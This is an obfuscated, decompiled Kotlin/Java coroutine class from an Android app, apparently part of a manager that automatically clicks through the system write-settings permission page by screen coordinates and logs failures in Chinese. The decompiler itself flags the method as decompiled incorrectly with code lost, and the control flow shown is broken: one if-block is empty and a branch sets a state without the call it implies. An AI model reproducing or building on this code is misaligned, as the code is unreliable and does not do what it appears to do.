package com.storm.safe.rock.service.modules;

import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.AbstractC1117qo;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.WriteSettingsPermissionManager$checkPageAfterClickWithControlTracking$3", m214403f = "WriteSettingsPermissionManager.kt", m214404l = {1713, 1718, 1725}, m214405m = "invokeSuspend")
/* renamed from: com.storm.safe.rock.service.modules.WriteSettingsPermissionManager$checkPageAfterClickWithControlTracking$3 */
/* loaded from: classes2.dex */
final class C0310x17ceb7e2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52958a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0327b2 f52959a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public C0310x17ceb7e2(C0327b2 c0327b2, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52959a2 = c0327b2;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new C0310x17ceb7e2(this.f52959a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((C0310x17ceb7e2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Code restructure failed: missing block: B:24:0x0056, code lost:
    
        if (com.storm.safe.rock.service.modules.C0327b2.m211693a0(r8, r7) == r0) goto L28;
     */
    /* JADX WARN: Code restructure failed: missing block: B:27:0x0061, code lost:
    
        if (r8 == r0) goto L28;
     */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52958a1;
        if (i == 0) {
            kg1.m213544f4(obj);
            this.f52958a1 = 1;
            if (b81.m210571b1(500L, this) != coroutineSingletons) {
            }
            return coroutineSingletons;
        }
        if (i != 1) {
            if (i != 2) {
                if (i != 3) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
                return C1351vv.f60710b1;
            }
            kg1.m213544f4(obj);
            if (!((Boolean) obj).booleanValue()) {
                t60.m214726f4("WriteSettingsPerm", "❌ 返回后重新检测坐标点击方案失败");
            }
            return C1351vv.f60710b1;
        }
        kg1.m213544f4(obj);
        if (this.f52959a2.f53169a3 && AbstractC1117qo.m214443d9(this.f52959a2.f53168a2)) {
            int iOrdinal = this.f52959a2.f53176b0.ordinal();
            if (iOrdinal == 0) {
                C0327b2 c0327b2 = this.f52959a2;
                this.f52958a1 = 2;
                obj = c0327b2.m211714a3(this);
            } else if (iOrdinal == 1) {
                C0327b2 c0327b22 = this.f52959a2;
                this.f52958a1 = 3;
            }
            return coroutineSingletons;
        }
        return C1351vv.f60710b1;
    }
}
